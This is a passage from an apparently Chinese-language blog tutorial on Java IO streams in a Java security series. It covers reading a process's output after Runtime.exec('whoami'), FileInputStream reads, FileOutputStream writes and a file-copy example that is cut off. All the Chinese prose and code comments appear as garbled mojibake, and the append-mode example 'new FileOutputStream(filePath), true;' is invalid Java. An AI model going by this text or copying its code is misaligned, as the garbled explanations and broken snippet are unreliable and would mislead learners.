‡å‡†è¾“å‡ºæµï¼ˆInputStreamï¼‰</span><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream();  <br><br>        <span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªç¼“å­˜åŒºï¼Œç”¨äºå­˜æ”¾æ¯æ¬¡ä»è¾“å…¥æµä¸­è¯»å–çš„æ•°æ®</span><br>        <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];  <br><br>        <span class="hljs-comment">// ç”¨ ByteArrayOutputStream æ¥å­˜å‚¨å®Œæ•´çš„è¾“å‡ºå†…å®¹ï¼ˆå› ä¸ºè¾“å‡ºå¯èƒ½åˆ†å¤šæ¬¡è¯»å®Œï¼‰</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();  <br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br>        <span class="hljs-comment">// å¾ªç¯è¯»å–å‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼Œç›´åˆ°è¯»åˆ° -1ï¼ˆè¡¨ç¤ºæµç»“æŸï¼‰</span><br>        <span class="hljs-keyword">while</span> ((readLen = inputStream.read(cache)) != -<span class="hljs-number">1</span>)&#123;  <br>            <span class="hljs-comment">// æŠŠæœ¬æ¬¡è¯»å–çš„å†…å®¹å†™å…¥ byteArrayOutputStream ä¸­</span><br>            byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);  <br>        &#125;  <br><br>        <span class="hljs-comment">// æ‰“å°å‘½ä»¤æ‰§è¡Œçš„ç»“æœ</span><br>        System.out.println(byteArrayOutputStream);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨çœ‹åˆ°è¿™é‡Œæ—¶å¿ƒé‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼š<strong>InputStream æ˜¯è¾“å…¥æµï¼Œä¸ºä»€ä¹ˆè¿™é‡Œæ‹¿æ¥è¯»å–å‘½ä»¤è¾“å‡ºï¼Ÿ</strong></p><p>å…³é”®åœ¨äº <strong>â€œè¾“å…¥&#x2F;è¾“å‡ºâ€ æ˜¯ç›¸å¯¹è°è€Œè¨€çš„</strong>ã€‚</p><ol><li><p>InputStream çš„åå­—æ¥æº</p><p>åœ¨ <strong>Java ç¨‹åºçš„è§’åº¦</strong>ï¼š</p><p><code>InputStream</code> &#x3D; â€œä»å¤–éƒ¨è¯»å…¥åˆ° Java ç¨‹åºé‡Œçš„æµâ€</p><p><code>OutputStream</code> &#x3D; â€œä» Java ç¨‹åºå†™å‡ºåˆ°å¤–éƒ¨çš„æµâ€</p><p>æ‰€ä»¥ <code>InputStream</code> çš„ <strong>è¾“å…¥</strong>ï¼Œæ˜¯â€œè¾“å…¥åˆ° Java ç¨‹åºâ€çš„æ„æ€ã€‚</p></li><li><p>åœ¨è¿™ä¸ªä¾‹å­é‡Œ</p><p>ä½ è°ƒç”¨äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>);<br><span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> process.getInputStream();<br></code></pre></td></tr></table></figure></li></ol><ul><li>è¿™ä¸ª <code>process</code> æ˜¯ä¸€ä¸ªå¤–éƒ¨å­è¿›ç¨‹ï¼ˆç³»ç»Ÿå‘½ä»¤ <code>whoami</code>ï¼‰ã€‚</li><li><strong>å¯¹è¿™ä¸ªå­è¿›ç¨‹æ¥è¯´</strong>ï¼Œå®ƒè°ƒç”¨ <code>System.out.println(...)</code> è¾“å‡ºç»“æœã€‚</li><li><strong>å¯¹ä½ çš„ Java ç¨‹åºæ¥è¯´</strong>ï¼Œä½ è¦å»è¯»å–å®ƒçš„è¾“å‡º â†’ è¿™ä¸ªè¾“å‡ºå°±æˆäº†ä½ ç¨‹åºçš„ <strong>è¾“å…¥æµ</strong>ã€‚</li></ul><p>â€‹      æ‰€ä»¥è¿™é‡Œå« <code>getInputStream()</code>ï¼Œæ˜¯ <strong>è·å–å­è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºï¼Œä½œä¸ºæœ¬è¿›ç¨‹çš„è¾“å…¥æµ</strong>ã€‚</p><ol start="3"><li><p>ä¸¾ä¸ªç”Ÿæ´»ç±»æ¯”</p><p>æƒ³è±¡ä½ å»å¿«é¤åº—ç‚¹é¤ï¼š</p><ul><li>å¨æˆ¿ï¼ˆå­è¿›ç¨‹ï¼‰æŠŠåšå¥½çš„é¤ç‚¹â€œè¾“å‡ºâ€ç»™ä½ ã€‚</li><li>ä½ ï¼ˆJava ç¨‹åºï¼‰æŠŠé¤ç‚¹â€œæ‹¿æ¥åƒâ€ï¼Œè¿™å¯¹ä½ æ¥è¯´å°±æ˜¯â€œè¾“å…¥â€ã€‚</li></ul><p>æ‰€ä»¥ <strong>åŒä¸€ä»½æ•°æ®ï¼Œæ—¢æ˜¯å¨æˆ¿çš„è¾“å‡ºï¼Œä¹Ÿæ˜¯ä½ çš„è¾“å…¥</strong>ã€‚</p></li></ol><h3 id="FileInputStream"><a href="#FileInputStream" class="headerlink" title="FileInputStream"></a>FileInputStream</h3><h4 id="read-æ–¹æ³•"><a href="#read-æ–¹æ³•" class="headerlink" title="read() æ–¹æ³•"></a>read() æ–¹æ³•</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">read() <br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">read</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException <br>ä»æ­¤è¾“å…¥æµä¸­è¯»å–ä¸€ä¸ªæ•°æ®å­—èŠ‚ã€‚<br><br>å¦‚æœæ²¡æœ‰è¾“å…¥å¯ç”¨ï¼Œåˆ™æ­¤æ–¹æ³•å°†é˜»å¡ã€‚ <br><br>æŒ‡å®šè€…ï¼š ç±» InputStream ä¸­çš„ read <br><br>è¿”å›ï¼š ä¸‹ä¸€ä¸ªæ•°æ®å­—èŠ‚ï¼›å¦‚æœå·²åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼Œåˆ™è¿”å› -<span class="hljs-number">1</span>ã€‚ <br><br>æŠ›å‡ºï¼š IOException - å¦‚æœå‘ç”Ÿ I/O é”™è¯¯ã€‚<br></code></pre></td></tr></table></figure><p>ä¹‹å‰æˆ‘ä»¬ç”¨ <code>file</code> çš„ä¸€ç³»åˆ—æ“ä½œè¯»å–è¿‡æ–‡ä»¶çš„ä¿¡æ¯ï¼Œç°åœ¨æˆ‘ä»¬ç”¨ <code>FileInputStream.read()</code> æ¥è¯»å–æ–‡ä»¶å†…å®¹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br>  <br><span class="hljs-keyword">import</span> java.io.FileInputStream;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-comment">// ä½¿ç”¨ FileInputStream.read è¯»å–æ–‡ä»¶  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileInputRead</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        readFile();  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new1.txt&quot;</span>;  <br> <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br> <span class="hljs-type">int</span> <span class="hljs-variable">readData</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br> <span class="hljs-keyword">try</span>&#123;  <br>            fileInputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filePath);  <br> <span class="hljs-keyword">while</span>((readData = fileInputStream.read())!=-<span class="hljs-number">1</span>)&#123;  <br>                System.out.print((<span class="hljs-type">char</span>)readData);  <br> &#125;  <br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>            e.printStackTrace();  <br> &#125; <span class="hljs-keyword">finally</span> &#123;  <br>            <span class="hljs-keyword">try</span>&#123;  <br>                fileInputStream.close();  <br> &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>                e.printStackTrace();  <br> &#125;  <br>        &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a23.png"></p><p>æˆåŠŸè¯»å–åˆ°æ–‡ä»¶å†…å®¹ï¼Œè¿™é‡Œæœ‰ä¸ªå°å‘</p><ul><li>ä½¿ç”¨print((char)readData)ï¼Œå­—ç¬¦èƒ½å¤Ÿè¿è´¯è¾“å‡º</li><li>ä½¿ç”¨println((char)readData)æ¢è¡Œï¼Œæ¯è¾“å‡ºä¸€ä¸ªå­—ç¬¦å°±ä¼šæ¢è¡Œ</li></ul><h4 id="read-byte-d-æ–¹æ³•"><a href="#read-byte-d-æ–¹æ³•" class="headerlink" title="read(byte[] d) æ–¹æ³•"></a>read(byte[] d) æ–¹æ³•</h4><p>å…è®¸åœ¨æ–¹æ³•ä¸­æ·»åŠ ä¸€ä¸ªå­—èŠ‚æ•°ç»„ã€‚<br>è¿™ç§æ–¹å¼å¾ˆæœ‰æ„æ€ï¼Œå½“æˆ‘ä»¬è®¾ç½®ç¼“å†²åŒºçš„å€¼ä¸º 8 æ—¶ï¼Œè‹¥æ–‡ä»¶ä¸­çš„å­—ç¬¦é•¿åº¦è¶…è¿‡äº† 8ï¼Œåˆ™ä¼šæ¢è¡Œè¾“å‡ºã€‚è¿™å’Œä¸Šé¢çš„æ¢è¡Œå®é™…ä¸Šæ˜¯å¼‚æ›²åŒå·¥ã€‚</p><p>å†å›åˆ°ä¹‹å‰æˆ‘ä»¬è®²çš„ <code>Runtime</code> ç±»è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„ Payloadï¼Œåœ¨é‚£é‡Œï¼Œæˆ‘ä»¬è®¾ç½®çš„ Cache ç¼“å†²åŒºçš„å€¼ä¸º 1024.</p><p><strong>read(byte[] d) æ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br>  <br><span class="hljs-keyword">import</span> java.io.FileInputStream;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-comment">// read(byte[] d) æ–¹æ³•ï¼Œå…è®¸åœ¨æ–¹æ³•ä¸­æ·»åŠ ä¸€ä¸ªå­—èŠ‚æ•°ç»„  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileInputRead02</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        readFile();  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new1.txt&quot;</span>;  <br> <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br> <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">8</span>]; <span class="hljs-comment">// è®¾ç½®ç¼“å†²åŒºï¼Œç¼“å†²åŒºå¤§å°ä¸º 8 å­—èŠ‚  </span><br> <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br> <span class="hljs-keyword">try</span> &#123;  <br>            fileInputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filePath);  <br> <span class="hljs-keyword">while</span>((readLen = fileInputStream.read(cache)) != -<span class="hljs-number">1</span>)&#123;  <br>                System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cache, <span class="hljs-number">0</span>, readLen));  <br> &#125;  <br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>                e.printStackTrace();  <br> &#125; <span class="hljs-keyword">finally</span> &#123;  <br>            <span class="hljs-keyword">try</span> &#123;  <br>                fileInputStream.close();  <br> &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>                e.printStackTrace();  <br> &#125;  <br>        &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œwhileå‡½æ•°ä¼šè¿è¡Œä¸¤æ¬¡ï¼Œè¯»å–æ–‡ä»¶ä¸­æ‰€æœ‰å­—ç¬¦</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a24.png"></p><h3 id="FileOutputStream"><a href="#FileOutputStream" class="headerlink" title="FileOutputStream"></a>FileOutputStream</h3><p>å¾€æ–‡ä»¶é‡Œé¢å†™æ•°æ®</p><h4 id="write-byte-b-æ–¹æ³•"><a href="#write-byte-b-æ–¹æ³•" class="headerlink" title="write(byte[] b) æ–¹æ³•"></a>write(byte[] b) æ–¹æ³•</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">write(<span class="hljs-type">byte</span>[] b)<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b)</span><br>           <span class="hljs-keyword">throws</span> IOException<br>å°† b.length ä¸ªå­—èŠ‚ä»æŒ‡å®š <span class="hljs-type">byte</span> æ•°ç»„å†™å…¥æ­¤æ–‡ä»¶è¾“å‡ºæµä¸­ã€‚<br>è¦†ç›–ï¼š<br>ç±» OutputStream ä¸­çš„ write<br>å‚æ•°ï¼š<br>b - æ•°æ®ã€‚<br>æŠ›å‡ºï¼š<br>IOException - å¦‚æœå‘ç”Ÿ I/O é”™è¯¯ã€‚<br></code></pre></td></tr></table></figure><p>å®ç°ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;<br><br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">// write(byte[] b) æ–¹æ³•</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileOutputWrite01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        writeFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeFile</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new1.txt&quot;</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123; <span class="hljs-comment">// æ³¨æ„fileOutputStreamçš„ä½œç”¨åŸŸï¼Œå› ä¸ºfileOutputStreaméœ€è¦åœ¨finallyåˆ†æ”¯ä¸­è¢«å¼‚å¸¸æ•è·</span><br>            <span class="hljs-comment">// æ‰€ä»¥è¿™é‡Œçš„ try å…ˆä¸é—­åˆ</span><br>            fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filePath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123 45&quot;</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//write(byte[] b) å°† b.length ä¸ªå­—èŠ‚ä»æŒ‡å®š byte æ•°ç»„å†™å…¥æ­¤æ–‡ä»¶è¾“å‡ºæµä¸­</span><br>                <span class="hljs-comment">//Stringç±»å‹çš„å­—ç¬¦ä¸²å¯ä»¥ä½¿ç”¨getBytes()æ–¹æ³•å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºbyteæ•°ç»„</span><br>                fileOutputStream.write(content.getBytes());<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (FileNotFoundException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                fileOutputStream.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸå†™å…¥</p><h4 id="write-byte-b-int-off-int-len-æ–¹æ³•"><a href="#write-byte-b-int-off-int-len-æ–¹æ³•" class="headerlink" title="write(byte[] b, int off, int len) æ–¹æ³•"></a>write(byte[] b, int off, int len) æ–¹æ³•</h4><ul><li><code>b</code>ï¼šè¦å†™å…¥çš„å­—èŠ‚æ•°ç»„</li><li><code>off</code>ï¼šä»æ•°ç»„çš„å“ªä¸ªä¸‹æ ‡å¼€å§‹å†™</li><li><code>len</code>ï¼šè¦å†™å…¥çš„å­—èŠ‚ä¸ªæ•°</li></ul><p>å…³é”®ç‚¹ï¼š<code>len</code> ä¸æ˜¯â€œå­—ç¬¦æ•°é‡â€ï¼Œè€Œæ˜¯â€œå­—èŠ‚æ•°é‡â€ã€‚</p><p>å¯¹äºè‹±æ–‡ï¼ˆå•å­—èŠ‚ç¼–ç ï¼‰ï¼Œ<code>å­—ç¬¦æ•° == å­—èŠ‚æ•°</code>ï¼Œæ‰€ä»¥æ„Ÿè§‰å°±æ˜¯â€œé•¿åº¦ç­‰äºå­—ç¬¦æ•°â€ã€‚</p><p>ä½†å¯¹äºä¸­æ–‡ï¼ˆUTF-8 ç¼–ç ä¸‹é€šå¸¸ 3 ä¸ªå­—èŠ‚ï¼‰ï¼Œä¸€ä¸ªå­—ç¬¦ â‰  ä¸€ä¸ªå­—èŠ‚ã€‚å¦‚æœä½ è¯¯ä»¥ä¸º <code>len=å­—ç¬¦æ•°</code> å°±ä¼šå‡ºé”™ï¼ˆå†™ä¸å®Œæ•´ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;<br><br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><br><span class="hljs-comment">// write(byte[] b) æ–¹æ³•</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileOutputWrite02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        writeFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeFile</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new1.txt&quot;</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123; <span class="hljs-comment">// æ³¨æ„fileOutputStreamçš„ä½œç”¨åŸŸï¼Œå› ä¸ºfileOutputStreaméœ€è¦åœ¨finallyåˆ†æ”¯ä¸­è¢«å¼‚å¸¸æ•è·</span><br>            <span class="hljs-comment">// æ‰€ä»¥è¿™é‡Œçš„ try å…ˆä¸é—­åˆ</span><br>            fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filePath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123 456&quot;</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//write(byte[] b) å°† b.length ä¸ªå­—èŠ‚ä»æŒ‡å®š byte æ•°ç»„å†™å…¥æ­¤æ–‡ä»¶è¾“å‡ºæµä¸­</span><br>                <span class="hljs-comment">//Stringç±»å‹çš„å­—ç¬¦ä¸²å¯ä»¥ä½¿ç”¨getBytes()æ–¹æ³•å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºbyteæ•°ç»„</span><br>                fileOutputStream.write(content.getBytes(StandardCharsets.UTF_8), <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (FileNotFoundException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                fileOutputStream.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¡ºåˆ©å†™å…¥</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a25.png"></p><h4 id="è¿½åŠ å†™å…¥"><a href="#è¿½åŠ å†™å…¥" class="headerlink" title="è¿½åŠ å†™å…¥"></a>è¿½åŠ å†™å…¥</h4><p>å¦‚æœæƒ³è¦å†™å…¥çš„æ•°æ®ä¸è¢«è¦†ç›–ï¼Œå¯ä»¥è®¾ç½® <code>FileOutputStream</code> çš„æ„é€ æ–¹æ³• <code>append</code> å‚æ•°è®¾ç½®ä¸º <code>true</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filePath);<br><span class="hljs-comment">// è®¾ç½®è¿½åŠ å†™å…¥</span><br>fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filePath), <span class="hljs-literal">true</span>;<br></code></pre></td></tr></table></figure><h3 id="æ–‡ä»¶æ‹·è´-â€“-input-outp-ç»“åˆ"><a href="#æ–‡ä»¶æ‹·è´-â€“-input-outp-ç»“åˆ" class="headerlink" title="æ–‡ä»¶æ‹·è´ â€“ input outp ç»“åˆ"></a>æ–‡ä»¶æ‹·è´ â€“ input outp ç»“åˆ</h3><p>åˆ©ç”¨å‰æ–‡è®²çš„ <code>fileInputStream</code> å’Œ <code>fileOutputStream</code> è¿›è¡Œæ–‡ä»¶æ‹·è´ã€‚</p><p>åŸç†ä¸Šæ¥è¯´ï¼Œå…ˆå°†æ–‡ä»¶çš„å†…å®¹(æ³¨æ„ï¼Œå…¶å®å›¾ç‰‡å½“ä¸­ä¹Ÿæ˜¯å†…å®¹ï¼Œè¿™ä¸ªå†…å®¹ä¸å…‰æ˜¯æ–‡å­—ï¼) è¯»å–å‡ºæ¥ï¼Œå†å†™å…¥æ–°çš„æ–‡ä»¶å½“ä¸­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br>  <br><span class="hljs-keyword">import</span> java.io.FileInputStream;  <br><span class="hljs-keyword">import</span> java.io.FileOutputStream;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-comment">// æ–‡ä»¶æ‹·è´æ“ä½œ  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title 